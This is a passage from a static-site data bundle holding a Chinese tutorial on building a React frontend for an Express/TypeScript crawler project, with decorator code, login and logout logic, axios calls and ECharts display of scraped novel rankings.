枚举，是router.get还是router.post\nexport enum pathtype {\n    get = 'get',\n    post = 'post'\n}\n// methodtype来区分是router.get还是router.post，这是包第一层工厂函数的原因\nfunction getrequestdecorator(methodtype: pathtype) {\n    // value是外部调用get(value)的入参，这也是再包一层工厂函数的原因\n    return function (value: string) {\n        // 类的方法的装饰器：target是方法所在的原型对象，key是方法名。最后的这个才是真正的装饰器。\n        return function (target: any, key: string) {\n            // 将handler和对应方法存入元素数据\n            // 'path'是metadatakey，value是metadatavalue，target是方法所在的原型对象，key是方法名\n            reflect.definemetadata('path', value, target, key);\n            // 存入元数据，你是router.get还是router.post\n            reflect.definemetadata('method', methodtype, target, key);\n        }\n    }\n}\n// get的装饰器，用于使用router.get()\nexport const get = getrequestdecorator(pathtype.get);\n// post的装饰器，用于使用router.post()\nexport const post = getrequestdecorator(pathtype.post);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nusedecorator.ts\n\nimport { requesthandler } from 'express';\n// use装饰器，用于使用中间件。这里包了一层工厂函数，因为要传middleware进来\nexport function use(middleware: requesthandler) {\n    // 真正的装饰器\n    return function (target: any, key: string) {\n        const originmiddleware: requesthandler[] = reflect.getmetadata('middlewares', target, key) || [];\n        // 可以使用多个中间件\n        originmiddleware.push(middleware);\n        reflect.definemetadata('middlewares', originmiddleware, target, key);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n",charsets:{cjk:!0}},{title:"3.用react展示爬虫数据",frontmatter:{title:"3.用react展示爬虫数据"},regularPath:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/3.%E7%94%A8react%E5%B1%95%E7%A4%BA%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE.html",relativePath:"book-web/项目/react+express+ts写爬虫/3.用react展示爬虫数据.md",key:"v-6bda811e",path:"/book-web/%E9%A1%B9%E7%9B%AE/react+express+ts%E5%86%99%E7%88%AC%E8%99%AB/3.%E7%94%A8react%E5%B1%95%E7%A4%BA%E7%88%AC%E8%99%AB%E6%95%B0%E6%8D%AE.html",headers:[{level:2,title:"项目初始化",slug:"项目初始化",normalizedTitle:"项目初始化",charIndex:19},{level:2,title:"使用路由",slug:"使用路由",normalizedTitle:"使用路由",charIndex:1109},{level:2,title:"编写登陆表单",slug:"编写登陆表单",normalizedTitle:"编写登陆表单",charIndex:1653},{level:2,title:"编写主页",slug:"编写主页",normalizedTitle:"编写主页",charIndex:3351},{level:2,title:"关联后端",slug:"关联后端",normalizedTitle:"关联后端",charIndex:4172},{level:2,title:"主页、登陆、登出",slug:"主页、登陆、登出",normalizedTitle:"主页、登陆、登出",charIndex:4815},{level:2,title:"爬取和展示",slug:"爬取和展示",normalizedTitle:"爬取和展示",charIndex:11801},{level:2,title:"统一前后端接口类型注解",slug:"统一前后端接口类型注解",normalizedTitle:"统一前后端接口类型注解",charIndex:18151}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"项目初始化 使用路由 编写登陆表单 编写主页 关联后端 主页、登陆、登出 爬取和展示 统一前后端接口类型注解",content:"# 用react展示爬虫数据\n\n\n# 项目初始化\n\n * 使用create-react-app这个项目脚手架:\n   \n   * 先卸载老旧的create-react-app，npm uninstall create-react-app -g。\n   * 然后全局安装它npm install create-react-app -g。\n   * 在一个空目录或者你的前端workspace下运行create-react-app crawler_react --template typescript --use-npm\n   * 上一条的命令是以ts版本的脚手架作为模板新建一个名为crawler_react的项目，use-npm是以npm方式下载包。\n\n * 项目用到的其他库或者插件\n   \n   * 会使用到antd这个前端组件库，会使用到react相关的路由，会使用到axios处理ajax，会使用到qs处理报文，会使用到echarts展示表格。\n   * 以上合起来的命令就是npm install antd react-router-dom qs axios echarts echarts-for-react --save和npm install @types/react-router-dom @types/qs @types/echarts -D。\n\n * 删除src中不需要的文件：\n   \n   * 删除入口文件index.tsx中的reportWebVitals和index.css的使用，对应删除reportWebVitals.ts文件和index.css文件；\n   * 清空App.tsx中的所有内容，删除logo.svg文件和App.css文件；\n   * 删除测试相关的文件setupTests.ts和App.test.tsx。\n\n * 如果有发现项目npm start后内存一直在涨就没停过，那就可能是内存泄漏了\n   \n   * 可以查看create-react-app项目3.3.0版本的一个issue，到目前4.0.0版本依然有这个问题。\n   * 可以下翻这个issue，找到一些规避方法，比如yarn上更新@babel/core，比如深度更新@babel/core，比如增加--max_old_space_size，比如禁用sourcemap或者降版本到3.2.0，比如注释webpack配置中的ts检查。\n   * 前几种方法要么无效有么就是操作麻烦，本人使用的最后一种方法，也就是“注释webpack配置中的ts检查”，注释后效果理想（从90%降到50%）。\n\n\n# 使用路由\n\nreact-router-dom在项目初始化时已经安装，在已经清空的App.tsx中引入react-router-dom的Route、HashRouter和Switch，会使用这三个来写路由组件，这个路由组件会暴露给入口文件index.tsx来使用。\n\nimport React from 'react';\nimport { HashRouter, Switch, Route } from 'react-router-dom';\nimport LoginView from \"./views/login/login\";\n\nconst ViewRouter = () => {\n  return (\n    <div>\n      <HashRouter>\n        <Switch>\n          <Route path=\"/login\" exact component={LoginView} />\n        </Switch>\n      </HashRouter>\n    </div>\n  );\n};\nexport default ViewRouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 编写登陆表单\n\n在src下新建一个views文件夹，再在views下新建一个login文件夹，再在login下新建login.tsc和login.css。\n\n要使用antd的组件，得先在入口文件index.tsx中引入import 'antd/dist/antd.css';。我们要编写表单中的登录框，可以在antd官网顶部搜索form，在右侧找到“登陆框”，然后将代码复制过来放到login.tsc里。\n\n去掉login.tsc里的ReactDOM.render(<NormalLoginForm />, mountNode);，还有username和remember两个item组件去掉，最后的注册Or <a href=\"\">register now!</a>也去掉。然后导入import React from 'react';，这样可以解决Form的报错。然后给整个登陆套一个div，写上我们自己的样式login.css。\n\nimport React, { Component } from 'react';\nimport { Form, Input, Button } from 'antd';\nimport { LockOutlined } from '@ant-design/icons';\nimport './login.css';\n\nexport default class LoginView extends Component {\n    public render() {\n        return (\n            <div className=\"login-border\">\n                <Form name=\"normal_login\" className=\"login-form\" initialValues={{ remember: true }} onFinish={this.onFinish} >\n                    <Form.Item name=\"password\" rules={[{ required: true, message: '请输入密码！' }]} >\n                        <Input\n                            prefix={<LockOutlined className=\"site-form-item-icon\" />}\n                            type=\"password\"\n                            placeholder=\"Password\"\n                        />\n                    </Form.Item>\n                    <Form.Item><Button type=\"primary\" htmlType=\"submit\" className=\"login-button\">登陆</Button></Form.Item>\n                </Form>\n            </div>\n        );\n    }\n    private onFinish(values: any) {\n        console.log('Received values of form: ', values);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n.login-border {\n    width: 300px;\n    margin: 100px auto;\n    padding: 20px 20px 0 20px;\n    border: 1px solid #ccc;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 编写主页\n\n在views下新建一个home文件夹，再在home下新建home.tsc和home.css。我们要编写按钮可以使用antd的<Button>，当然需要引入import { Button } from 'antd';，然后我们自己写个div包裹它，再调一下样式。\n\nimport React, { Component } from 'react';\nimport './home.css';\nimport { Button } from 'antd';\n\nexport default class HomeView extends Component {\n    public render() {\n        return (\n            <div className=\"home-border\">\n                <Button type=\"primary\">查看数据</Button>\n                <Button type=\"primary\">爬取数据</Button>\n                <Button type=\"primary\">退出登陆</Button>\n            </div>\n        );\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n.home-border {\n    width: 350px;\n    margin: 100px auto;\n    padding: 20px 0 20px 20px;\n    border: 1px solid #ccc;\n    border-radius: 5px;\n}\n.home-border .ant-btn {\n    margin-right: 21px;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 关联后端\n\naxios在项目初始化时已经安装了，我们要使用axios发送ajax请求来关联后端，使用时先导入import axios from 'axios';。然后我们需要打开本项目的代理，目的是让前端发送的请求让代理转发到后端服务上（都没有部署并且都在本地），具体就是打开package.json文件，在里面加上\"proxy\": \"http://localhost:7001/\"的配置，这个地址就是后端启动后访问的地址。\n\n我们将axios请求放到react的componentDidMount声明周期函数里写。使用axios.get()，参数是接口地址常以/api开头，返回的是个promise。写完后，后端要对应有api/xxx的接口。\n\n前端home.tsx部分代码\n\ncomponentDidMount() {\n    axios.get('/api/isLogin').then((res) => {\n        console.log('res', res);\n    });\n}\n\n\n1\n2\n3\n4\n5\n\n\n后端LoginController.ts部分代码\n\n@get('/api/isLogin')\nprivate isLoginApi(req: ExpRequest, res: Response): void {\n    res.json(getResponse<boolean>(isLogin(req, res)));\n}\n\n\n1\n2\n3\n4\n\n\n\n# 主页、登陆、登出\n\n主页：在进入主页时需要判断是否已登陆，已登陆就加载主页，否则重定向到登陆页。这个登陆状态需要使用state来存储，在接口返回时使用this.setState()来更新状态，这样就会触发render。重定向使用react-router-dom的Redirect标签。\n\n登陆：登陆页的逻辑首先也是判断是否已经登陆了，登陆就直接重定向到主页，否则显示登陆框，登陆框的登陆要调用后端的/api/login接口，其他的处理同主页一样（使用state、重定向标签）。\n\n登出：登出按钮在主页，需要添加一个onClick事件，然后请求/api/logout接口，接口返回成功后要更新state，并重定向到登陆页。\n\nhome.tsx\n\nimport React, { Component } from 'react';\nimport { Redirect } from 'react-router-dom'\nimport './home.css';\nimport { Button } from 'antd';\nimport axios from 'axios';\n\nexport default class HomeView extends Component {\n    public state = { isLogin: false, loaded: false }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setState后组件会重新渲染\n    componentDidMount() {\n        // ajax请求\n        axios.get('/api/isLogin').then((res) => {\n            if (res.data?.data) {\n                this.setState({ isLogin: true, loaded: true });\n            } else {\n                this.setState({ isLogin: false, loaded: true });\n            }\n        });\n    }\n    // 渲染组件\n    public render() {\n        const { isLogin, loaded } = this.state;\n        if (loaded) { // isLogin接口走完了才显示页面\n            if (isLogin) { // 登陆了就显示主页\n                return (\n                    <div className=\"home-border\">\n                        <Button type=\"primary\">查看数据</Button>\n                        <Button type=\"primary\">爬取数据</Button>\n                        <Button type=\"primary\" onClick={() => { this.logout() }}>退出登陆</Button>\n                    </div>\n                );\n            }\n            return <Redirect to=\"/login\" />; // 没登录就重定向到登陆页\n        }\n        return null;\n    }\n    // 登出\n    private async logout() {\n        const res = await axios.get('/api/logout');\n        if (res.data?.data) {\n            this.setState({ isLogin: false });\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\nlogin.tsx\n\nimport React from 'react';\nimport { Form, Input, Button, message } from 'antd';\nimport { LockOutlined } from '@ant-design/icons';\nimport axios from 'axios';\nimport qs from 'qs';\nimport { Redirect } from 'react-router-dom'\nimport './login.css';\n\ninterface Istate { isLogin: boolean, loaded: boolean }\n\nexport default class LoginView extends React.Component<any, Istate> {\n    constructor(props: any) {\n        super(props);\n        this.state = { isLogin: false, loaded: false };\n        this.submit = this.submit.bind(this);\n    }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setState后组件会重新渲染\n    componentDidMount() {\n        // ajax请求\n        axios.get('/api/isLogin').then((res) => {\n            if (res.data?.data) {\n                this.setState({ isLogin: true, loaded: true });\n            } else {\n                this.setState({ isLogin: false, loaded: true });\n            }\n        });\n    }\n    public render() {\n        const { isLogin, loaded } = this.state;\n        if (loaded) { // isLogin接口走完了才显示页面\n            if (!isLogin) { // 没登陆就显示登陆框\n                return (\n                    <div className=\"login-border\">\n                        <Form name=\"normal_login\" className=\"login-form\" initialValues={{ remember: true }} onFinish={this.submit} >\n                            <Form.Item name=\"password\" rules={[{ required: true, message: '请输入密码！' }]} >\n                                <Input\n                                    prefix={<LockOutlined className=\"site-form-item-icon\" />}\n                                    type=\"password\"\n                                    placeholder=\"Password\"\n                                />\n                            </Form.Item>\n                            <Form.Item><Button type=\"primary\" htmlType=\"submit\" className=\"login-button\">登陆</Button></Form.Item>\n                        </Form>\n                    </div>\n                );\n            }\n            return <Redirect to=\"/\"></Redirect>; // 登陆了就重定向到主页\n        }\n        return null;\n    }\n    // 点击“登陆”按钮\n    private async submit(values: any) {\n        if (values && values.password) {\n            const res = await axios.post(\n                '/api/login', // 接口名，登陆校验的接口\n                qs.stringify({ password: values.password }), // qs会处理传参，headers得完善\n                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }\n            );\n            if (res.data?.data) {\n                this.setState({ isLogin: true }); // 登陆了更新状态\n            } else {\n                message.error('登陆失败');\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n\n\n其实后端也做了修改，主要是去掉后端的/处理，然后给根路径设置为api。\n\nLoginController.ts\n\nimport { Request, Response, NextFunction, RequestHandler } from 'express';\nimport 'reflect-metadata';\nimport { controller } from \"../decorator/controllerDecorator\";\nimport { get, post } from \"../decorator/requestDecorator\";\nimport { use } from \"../decorator/useDecorator\";\nimport { getResponse } from '../utils/getResponse';\n\n// 请求体的session\ninterface ISession extends CookieSessionInterfaces.CookieSessionObject {\n    login: boolean;\n}\n// 请求体\nexport interface ExpRequest extends Request {\n    body: {\n        [key: string]: string | undefined;\n    },\n    session: ISession\n};\n// 登陆状态\nconst isLogin = (req: ExpRequest, res: Response): boolean => {\n    return !!(req.session && req.session.login);\n};\n// 登陆状态的中间件\nexport const checkLogin: RequestHandler = (req: ExpRequest, res: Response, next: NextFunction): void => {\n    if (isLogin(req, res)) {\n        next();\n    } else {\n        res.json(getResponse<boolean>(false, '您还没有登陆！请先登陆！'));\n    }\n};\n// 根路径\nconst root: string = '/api';\n\n// 这个类不用实例化也不用静态调用，但是一定要在index.ts里导入，因为要触发装饰器\n@controller(root)\nclass LoginController {\n    // 登陆校验\n    @post('/login')\n    private loginPost(req: ExpRequest, res: Response): void {\n        if (isLogin(req, res)) {\n            res.json(getResponse<boolean>(true));\n        } else {\n            const { password } = req.body;\n            if (password === '123') {\n                // 登陆状态更新\n                req.session.login = true;\n                res.json(getResponse<boolean>(true));\n            } else {\n                res.json(getResponse<boolean>(false, '密码错误！'));\n            }\n        }\n    }\n    // 登出\n    @get('/logout')\n    private logout(req: ExpRequest, res: Response): void {\n        if (isLogin(req, res)) {\n            req.session.login = undefined;\n            res.json(getResponse<boolean>(true));\n        } else {\n            res.json(getResponse<boolean>(false, '您本来就是未登录状态！'));\n        }\n    }\n    // 是否已登陆\n    @get('/isLogin')\n    private isLoginApi(req: ExpRequest, res: Response): void {\n        res.json(getResponse<boolean>(isLogin(req, res)));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n\n# 爬取和展示\n\n爬取：爬取按钮在主页，需要添加一个onClick事件，然后请求/api/data接口，接口返回后提示用户爬取成功或者失败。\n\n展示：展示就使用echarts，根据我们的需要选择一个柱状图，将链接里的实例复制过来。\n\n首先导入import ReactEcharts from 'echarts-for-react'，然后使用这个标签<ReactEcharts option={this.getOption()} onEvents={this._onEvents} />，需要在getOption方法里给这个图表赋予数据。那么得请求/api/show接口，然后存储在state中。具体在getOption中将state中存储的数据转化为echarts所需要的数据，也就是之前复制过来的实例。转化的过程中还需要参考配置项，比如标签的单选等。\n\nimport React from 'react';\nimport { Redirect } from 'react-router-dom'\nimport './home.css';\nimport { Button, message } from 'antd';\nimport ReactEcharts from 'echarts-for-react';\nimport axios from 'axios';\n\n// 汇总信息（所有榜单的汇总）\ninterface IrankInfo {\n    name: string;       // 名字or标题\n    list: Irank[]       // 具体榜单\n}\n// 具体榜单信息\ninterface Irank {\n    name: string;       // 名字or标题\n    list: Ibook[]       // 榜单里的具体小说\n}\n// 小说信息\ninterface Ibook {\n    num: string;        // 序号（排名）\n    bookName: string;   // 书名\n    bookCount: string;  // 票数or点击率or人气\n}\n// echarts纵坐标\ninterface IyAxisData {\n    [key: string]: string[]\n}\n// 切换榜单事件\ntype Func = (...args: any[]) => any;\ninterface EventMap {\n    [key: string]: Func,\n}\n// react的state\ninterface Istate {\n    isLogin: boolean;   // 是否登录\n    loaded: boolean;    // 登录接口是否请求完\n    data: IrankInfo;    // 排行榜数据\n}\nexport default class HomeView extends React.Component<any, Istate> {\n    // echarts绑定事件\n    private _onEvents: EventMap = {\n        'legendselectchanged': this.onLegendChang.bind(this) // 切换榜单事件\n    };\n    private _yAxisData: IyAxisData = {}; // 纵坐标\n    constructor(props: any) {\n        super(props);\n        this.state = { isLogin: false, loaded: false, data: { name: '', list: [] } }; // 初始化state\n        this.crawlerData = this.crawlerData.bind(this); // 给事件绑定this\n        this.logout = this.logout.bind(this);           // 给事件绑定this\n    }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setState后组件会重新渲染\n    public async componentDidMount() {\n        // 是否登录\n        const isLoginRes = await axios.get('/api/isLogin');\n        if (isLoginRes.data?.data) {\n            this.setState({ isLogin: true, loaded: true });\n        } else {\n            this.setState({ isLogin: false, loaded: true });\n        }\n        const showRes = await axios.get('/api/show');\n        if (showRes.data?.data) {\n            this.setState({ data: showRes.data.data });\n        } else {\n            message.error('展示数据获取失败！');\n        }\n    }\n    // 渲染组件\n    public render() {\n        const { isLogin, loaded } = this.state;\n        if (loaded) { // isLogin接口走完了才显示页面\n            if (isLogin) { // 登陆了就显示主页\n                return (\n                    <div className=\"home-border\">\n                        <div className=\"buttons\">\n                            <Button type=\"primary\" onClick={this.crawlerData}>爬取数据</Button>\n                            <Button type=\"primary\" onClick={this.logout}>退出登陆</Button>\n                        </div>\n                        <ReactEcharts option={this.getOption()} onEvents={this._onEvents} />\n                    </div>\n                );\n            }\n            return <Redirect to=\"/login\" />; // 没登录就重定向到登陆页\n        }\n        return null;\n    }\n    // 登出\n    private async logout() {\n        const res = await axios.get('/api/logout');\n        if (res.data?.data) {\n            this.setState({ isLogin: false });\n        } else {\n            message.error('退出失败！');\n        }\n    }\n    // 爬取一次数据\n    private async crawlerData() {\n        const res = await axios.get('/api/data');\n        if (res.data?.data) {\n            message.success('爬取成功！');\n        } else {\n            message.error('爬取失败！');\n        }\n    }\n    // echarts数据，类型注解先从'echarts-for-react'找不到合适的再去'echarts'的类型定义文件里找\n    private getOption(): echarts.EChartOption {\n        const data: IrankInfo = this.state.data;\n        const title = data.list.length ? '数据来自纵横中文网' : '';\n        const legendArr: string[] = [];\n        const series: echarts.EChartOption.Series[] = [];\n        data.list.forEach((value: Irank, index: number) => {\n            legendArr.push(value.name);\n            // 保证book是按照num降序排列\n            const bookList = value.list.sort((a, b) => parseInt(b['num']) - parseInt(a['num']));\n            const bookData: number[] = [];\n            const nameArr: string[] = [];\n            bookList.forEach((value: Ibook, index: number) => {\n                bookData.push(parseInt(value.bookCount));\n                nameArr.push(value.bookName);\n            });\n            this._yAxisData[value.name] = nameArr;\n            series.push({ name: value.name, type: 'bar', data: bookData });\n        });\n        return {\n            title: {\n                text: data.name,\n                subtext: title\n            },\n            legend: {\n                selectedMode: 'single', // 单选\n                data: legendArr\n            },\n            tooltip: {                  // 数据悬浮显示\n                trigger: 'axis',\n                axisPointer: {\n                    type: 'shadow'\n                }\n            },\n            grid: {\n                left: '3%',\n                right: '4%',\n                bottom: '3%',\n                containLabel: true\n            },\n            xAxis: {\n                type: 'value',\n                boundaryGap: [0, 0.01]\n            },\n            yAxis: {\n                type: 'category',\n                data: this._yAxisData[legendArr[0]]\n            },\n            series\n        };\n    }\n    // 切换榜单\n    private onLegendChang(param: any, echarts: echarts.ECharts) {\n        // console.log('param', param);\n        // console.log('echarts', echarts);\n        const option = echarts.getOption();\n        if (option != null) {\n            option.yAxis = {\n                type: 'category',\n                data: this._yAxisData[param.name]\n            }\n        }\n        echarts.setOption(option);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n\n\n\n# 统一前后端接口类型注解\n\n因为前后端接口传递的数据是一样的，那么可以让它们用同一份类型定义文件。分别放到前后端的src目录下即可，对应前后端接口相关的类型就使用下面这份类型定义。\n\nresRlt.d.ts\n\ndeclare namespace ResRlt {\n    // 汇总信息（所有榜单的汇总）\n    interface IrankInfo {\n        name: string;       // 名字or标题\n        list: Irank[]       // 具体榜单\n    }\n    // 具体榜单信息\n    interface Irank {\n        name: string;       // 名字or标题\n        list: Ibook[]       // 榜单里的具体小说\n    }\n    // 小说信息\n    interface Ibook {\n        num: string;        // 序号（排名）\n        bookName: string;   // 书名\n        bookCount: string;  // 票数or点击率or人气\n    }\n    type LoginRes = boolean;\n    type LogoutRes = boolean;\n    type IsLoginRes = boolean;\n    type DataRes = boolean;\n    type ShowRes = IrankInfo | boolean;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n",normalizedContent:"# 用react展示爬虫数据\n\n\n# 项目初始化\n\n * 使用create-react-app这个项目脚手架:\n   \n   * 先卸载老旧的create-react-app，npm uninstall create-react-app -g。\n   * 然后全局安装它npm install create-react-app -g。\n   * 在一个空目录或者你的前端workspace下运行create-react-app crawler_react --template typescript --use-npm\n   * 上一条的命令是以ts版本的脚手架作为模板新建一个名为crawler_react的项目，use-npm是以npm方式下载包。\n\n * 项目用到的其他库或者插件\n   \n   * 会使用到antd这个前端组件库，会使用到react相关的路由，会使用到axios处理ajax，会使用到qs处理报文，会使用到echarts展示表格。\n   * 以上合起来的命令就是npm install antd react-router-dom qs axios echarts echarts-for-react --save和npm install @types/react-router-dom @types/qs @types/echarts -d。\n\n * 删除src中不需要的文件：\n   \n   * 删除入口文件index.tsx中的reportwebvitals和index.css的使用，对应删除reportwebvitals.ts文件和index.css文件；\n   * 清空app.tsx中的所有内容，删除logo.svg文件和app.css文件；\n   * 删除测试相关的文件setuptests.ts和app.test.tsx。\n\n * 如果有发现项目npm start后内存一直在涨就没停过，那就可能是内存泄漏了\n   \n   * 可以查看create-react-app项目3.3.0版本的一个issue，到目前4.0.0版本依然有这个问题。\n   * 可以下翻这个issue，找到一些规避方法，比如yarn上更新@babel/core，比如深度更新@babel/core，比如增加--max_old_space_size，比如禁用sourcemap或者降版本到3.2.0，比如注释webpack配置中的ts检查。\n   * 前几种方法要么无效有么就是操作麻烦，本人使用的最后一种方法，也就是“注释webpack配置中的ts检查”，注释后效果理想（从90%降到50%）。\n\n\n# 使用路由\n\nreact-router-dom在项目初始化时已经安装，在已经清空的app.tsx中引入react-router-dom的route、hashrouter和switch，会使用这三个来写路由组件，这个路由组件会暴露给入口文件index.tsx来使用。\n\nimport react from 'react';\nimport { hashrouter, switch, route } from 'react-router-dom';\nimport loginview from \"./views/login/login\";\n\nconst viewrouter = () => {\n  return (\n    <div>\n      <hashrouter>\n        <switch>\n          <route path=\"/login\" exact component={loginview} />\n        </switch>\n      </hashrouter>\n    </div>\n  );\n};\nexport default viewrouter;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 编写登陆表单\n\n在src下新建一个views文件夹，再在views下新建一个login文件夹，再在login下新建login.tsc和login.css。\n\n要使用antd的组件，得先在入口文件index.tsx中引入import 'antd/dist/antd.css';。我们要编写表单中的登录框，可以在antd官网顶部搜索form，在右侧找到“登陆框”，然后将代码复制过来放到login.tsc里。\n\n去掉login.tsc里的reactdom.render(<normalloginform />, mountnode);，还有username和remember两个item组件去掉，最后的注册or <a href=\"\">register now!</a>也去掉。然后导入import react from 'react';，这样可以解决form的报错。然后给整个登陆套一个div，写上我们自己的样式login.css。\n\nimport react, { component } from 'react';\nimport { form, input, button } from 'antd';\nimport { lockoutlined } from '@ant-design/icons';\nimport './login.css';\n\nexport default class loginview extends component {\n    public render() {\n        return (\n            <div classname=\"login-border\">\n                <form name=\"normal_login\" classname=\"login-form\" initialvalues={{ remember: true }} onfinish={this.onfinish} >\n                    <form.item name=\"password\" rules={[{ required: true, message: '请输入密码！' }]} >\n                        <input\n                            prefix={<lockoutlined classname=\"site-form-item-icon\" />}\n                            type=\"password\"\n                            placeholder=\"password\"\n                        />\n                    </form.item>\n                    <form.item><button type=\"primary\" htmltype=\"submit\" classname=\"login-button\">登陆</button></form.item>\n                </form>\n            </div>\n        );\n    }\n    private onfinish(values: any) {\n        console.log('received values of form: ', values);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n.login-border {\n    width: 300px;\n    margin: 100px auto;\n    padding: 20px 20px 0 20px;\n    border: 1px solid #ccc;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 编写主页\n\n在views下新建一个home文件夹，再在home下新建home.tsc和home.css。我们要编写按钮可以使用antd的<button>，当然需要引入import { button } from 'antd';，然后我们自己写个div包裹它，再调一下样式。\n\nimport react, { component } from 'react';\nimport './home.css';\nimport { button } from 'antd';\n\nexport default class homeview extends component {\n    public render() {\n        return (\n            <div classname=\"home-border\">\n                <button type=\"primary\">查看数据</button>\n                <button type=\"primary\">爬取数据</button>\n                <button type=\"primary\">退出登陆</button>\n            </div>\n        );\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n.home-border {\n    width: 350px;\n    margin: 100px auto;\n    padding: 20px 0 20px 20px;\n    border: 1px solid #ccc;\n    border-radius: 5px;\n}\n.home-border .ant-btn {\n    margin-right: 21px;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 关联后端\n\naxios在项目初始化时已经安装了，我们要使用axios发送ajax请求来关联后端，使用时先导入import axios from 'axios';。然后我们需要打开本项目的代理，目的是让前端发送的请求让代理转发到后端服务上（都没有部署并且都在本地），具体就是打开package.json文件，在里面加上\"proxy\": \"http://localhost:7001/\"的配置，这个地址就是后端启动后访问的地址。\n\n我们将axios请求放到react的componentdidmount声明周期函数里写。使用axios.get()，参数是接口地址常以/api开头，返回的是个promise。写完后，后端要对应有api/xxx的接口。\n\n前端home.tsx部分代码\n\ncomponentdidmount() {\n    axios.get('/api/islogin').then((res) => {\n        console.log('res', res);\n    });\n}\n\n\n1\n2\n3\n4\n5\n\n\n后端logincontroller.ts部分代码\n\n@get('/api/islogin')\nprivate isloginapi(req: exprequest, res: response): void {\n    res.json(getresponse<boolean>(islogin(req, res)));\n}\n\n\n1\n2\n3\n4\n\n\n\n# 主页、登陆、登出\n\n主页：在进入主页时需要判断是否已登陆，已登陆就加载主页，否则重定向到登陆页。这个登陆状态需要使用state来存储，在接口返回时使用this.setstate()来更新状态，这样就会触发render。重定向使用react-router-dom的redirect标签。\n\n登陆：登陆页的逻辑首先也是判断是否已经登陆了，登陆就直接重定向到主页，否则显示登陆框，登陆框的登陆要调用后端的/api/login接口，其他的处理同主页一样（使用state、重定向标签）。\n\n登出：登出按钮在主页，需要添加一个onclick事件，然后请求/api/logout接口，接口返回成功后要更新state，并重定向到登陆页。\n\nhome.tsx\n\nimport react, { component } from 'react';\nimport { redirect } from 'react-router-dom'\nimport './home.css';\nimport { button } from 'antd';\nimport axios from 'axios';\n\nexport default class homeview extends component {\n    public state = { islogin: false, loaded: false }\n    // 组件第一次渲染完成，此时dom节点已经生成，可以在这里调用ajax请求，返回数据，setstate后组件会重新渲染\n    componentdidmount() {\n        // ajax请求\n        axios.get('/api/islogin').then((res) => {\n            if (res.data?.data) {\n                this.setstate({ islogin: true, loaded: true });\n            } else {\n                this.setstate({ islogin: false, loaded: true });\n            }\n        });\n    }\n    // 渲染组件\n    public render() {\n        const { islogin, loaded } = this.state;\n        if (loaded) { // 